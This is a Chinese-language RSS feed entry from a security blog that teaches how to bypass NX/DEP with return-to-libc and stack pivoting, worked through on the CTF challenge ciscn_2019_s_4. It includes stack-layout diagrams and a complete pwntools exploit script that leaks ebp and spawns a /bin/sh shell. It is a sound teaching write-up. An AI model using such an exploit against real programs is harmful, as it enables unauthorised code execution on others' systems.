@@ -1,0 +1,136 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>alazymachine • Posts by &#34;bypass&#34; tag</title>
+        <link>https://alazymechnaic.github.io</link>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Tue, 02 May 2023 14:56:58 +0800</pubDate>
+        <lastBuildDate>Tue, 02 May 2023 14:56:58 +0800</lastBuildDate>
+        <category>paper</category>
+        <category>HEAP PWN CTF</category>
+        <category>pwn</category>
+        <category>Linux</category>
+        <category>Paper</category>
+        <category>fuzz</category>
+        <category>bypass</category>
+        <category>clash</category>
+        <category>go, RE</category>
+        <category>kernel pwn</category>
+        <category>binary</category>
+        <category>personal</category>
+        <item>
+            <guid isPermalink="true">https://alazymechnaic.github.io/2023/05/02/bypass-nx/</guid>
+            <title>bypass-NX</title>
+            <link>https://alazymechnaic.github.io/2023/05/02/bypass-nx/</link>
+            <category>bypass</category>
+            <pubDate>Tue, 02 May 2023 14:56:58 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;Bypass-NX（DEP）&#34;&gt;&lt;a href=&#34;#Bypass-NX（DEP）&#34; class=&#34;headerlink&#34; title=&#34;Bypass NX（DEP）&#34;&gt;&lt;/a&gt;Bypass NX（DEP）&lt;/h2&gt;&lt;h3 id=&#34;简介&#34;&gt;&lt;a href=&#34;#简介&#34; class=&#34;headerlink&#34; title=&#34;简介&#34;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;​	栈不可执行（NX），其实也称为DEP(Data Execution PreventionData Execution Prevention),用于防止在栈上执行代码，当该保护开启时，会触发程序的&lt;strong&gt;SIGSEGV&lt;/strong&gt; 错误。这里需要注意的一点为，开启该选项后，不只是栈段，数据段（堆段）依然处于不可执行的状态。&lt;/p&gt;
+&lt;h3 id=&#34;绕过&#34;&gt;&lt;a href=&#34;#绕过&#34; class=&#34;headerlink&#34; title=&#34;绕过&#34;&gt;&lt;/a&gt;绕过&lt;/h3&gt;&lt;p&gt;​	既然无法将shellcode注入到数据段上并执行，那就只能修改IP指向已有的代码部分。例如采用技术 Return-to-libc,修改当前的EIP指针向已有的库函数，并且传递相应的参数。（&lt;strong&gt;如果在开启了NX的情况下如何进行单字节溢出的利用&lt;/strong&gt;）。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;least privilege &amp;amp; seteuid(getuid())&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;​	在实际的应用程序中会采用最小特权原则，并且能够进行权限继承，因此，攻击者能够获取与当前程序相同权限的shell，但在程序中可以通过setuid的方式主动放弃不必要的权限。因此，如果想要获得更高权限的shell需要构造以下调用序列：&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token function&#34;&gt;seteuid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;“sh”&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;token function&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但是存在问题，setuid的参数是\x00，但是strcpy在遇到\x00后会自动停止，并不能将其拷贝到栈中。因此需要使用到两个技术：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ESP lifting (ESP抬升)&lt;/li&gt;
+&lt;li&gt;Frame Faking(栈帧伪造)&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=&#34;&gt;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;其实二者是一个东西，本质是和之前的单字节溢出，利用leave | ret指令实现栈抬升相同，主要使用leave和ret两个指令：&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;leave:
+        move esp,ebp ; 恢复栈顶指针
+        pop ebp ;(esp=esp+4)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;栈迁移的本质是重新构造出进入jmp system_got 时的栈情况，最终目的是将esp迁移过来。但是需要注意的一点是，一次leave ret指令智能将esp抬升上去，并不能对ebp做任何操作，因此需要进行两次leave ret指令，第一个ret不能返回到system而是找到gadget：&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;esp,ebp --&amp;gt; old_ebp
+        --&amp;gt; ret_addr
+        --&amp;gt; arg1 :此处是指向system字符串参数的指针
+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr&gt;
+&lt;h3 id=&#34;例题-ciscn-2019-s-4&#34;&gt;&lt;a href=&#34;#例题-ciscn-2019-s-4&#34; class=&#34;headerlink&#34; title=&#34;例题 ciscn_2019_s_4&#34;&gt;&lt;/a&gt;例题 ciscn_2019_s_4&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png&#34; alt=&#34;image-20230504193243253&#34;&gt;&lt;/p&gt;
+&lt;p&gt;题目很简单，buff的长度有40，但是read函数长度有48，多出八个字节能够溢出。总体思路是进行rop，但是由于溢出长度有限，在vul函数退出后进行了清理堆栈的操作，导致后面的内容不可控，因此需要进行栈迁移，将更多的栈部分可控。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png&#34; alt=&#34;image-20230504193612815&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在32位程序下，栈按照四个字节进行对齐，因此溢出的八个字节能够覆盖ebp指针和ret地址。一个函数在执行leave | ret之前的状态如下：&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;esp -&amp;gt; [???] ; 此时的esp指针可能会指向栈中的任意位置
+...
+ebp -&amp;gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
+	   [ret_add] ; 记录当前的返回地址&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;上述经过栈溢出后，old_ebp和ret_addr被覆盖为new_ebp, new_ret_addr,在执行leave ret指令后的栈空间：&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;inst: 
+	mov esp,ebp
+----------------------------------------------
+ebp,esp -&amp;gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
+	   [new_ret_addr] ; 记录当前的返回地址
+----------------------------------------------
+inst: 
+	pop ebp
+----------------------------------------------
+ebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论
+esp -&amp;gt; [new_ret_addr] ; 记录当前的返回地址&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但是注意此时还并没有完全将栈迁移出去。此时的esp还在低位，如果直接将new_ret_addr覆盖为system，则此时索引的arg参数是esp + 0x4（因为在执行过call函数后，压入了call system的下一个地址），比esp地址更高的位置显然是不可控的（注意这里，栈是向低地址增长的，新函数的参数由父函数压入，因此在高地址）。需要将esp进行同样的抬升。因此需要再次执行leave ret指令继续修改。&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;inst: 
+	mov esp,ebp
+----------------------------------------------
+ebp,esp = buff_ ; 执行结束后完成将esp的抬升
+----------------------------------------------
+inst: 
+	pop ebp
+----------------------------------------------
+esp = buff_ ;  
+ebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;所以该题目的思路也逐渐清晰，就是要通过溢出将esp抬升。抬升前需要指导buff的地址，也就是esp应该抬升到哪里去，本题还需要用到的部分是&lt;strong&gt;printf&lt;/strong&gt;本身在输出的时候接收一个字符串指针，并自动执行到\x00的位置结束。因此可以利用该机制进行ebp的泄露。&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
+sh &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./ciscn_s_4&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+elf&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./ciscn_s_4&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;arch &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
+	静态查找leave ret指令地址
+&#39;&#39;&#39;&lt;/span&gt;
+system_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x8048400&lt;/span&gt;
+leave_ret_addr&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x080484B8&lt;/span&gt;
+ret_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;system_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
+	第一次直接构造和buff长度相同的输入，printf时会输出后续内容
+&#39;&#39;&#39;&lt;/span&gt;
+payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x28&lt;/span&gt;
+sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name?\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
+	接收泄露的ebp输出
+&#39;&#39;&#39;&lt;/span&gt;
+sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+ebp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; u32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
+	这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38
+&#39;&#39;&#39;&lt;/span&gt;
+fake_ebp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ebp &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x38&lt;/span&gt;
+&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
+	构造第二次输入的payload
+&#39;&#39;&#39;&lt;/span&gt;
+payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;system_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# ret addr&lt;/span&gt;
+payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;aaaa&#39;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# junk ret addr 用于模拟call system时的压入返回值操作&lt;/span&gt;
+payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fake_ebp&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针&lt;/span&gt;
+payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;/bin/sh\x00&#39;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# payload&lt;/span&gt;
+payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 这里对当前的栈进行补齐操作&lt;/span&gt;
+payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fake_ebp&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp&lt;/span&gt;
+payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;leave_ret_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 填入leave ret返回值&lt;/span&gt;
+sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;注意两个关键位置：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;payload+=p32(fake_ebp+12) # 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;payload+=p32(fake_ebp-4) # 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYV90aW1lL2FydGljbGUvZGV0YWlscy8xMDYxNDI5NzE=&#34;&gt;https://blog.csdn.net/sea_time/article/details/106142971&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=&#34;&gt;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
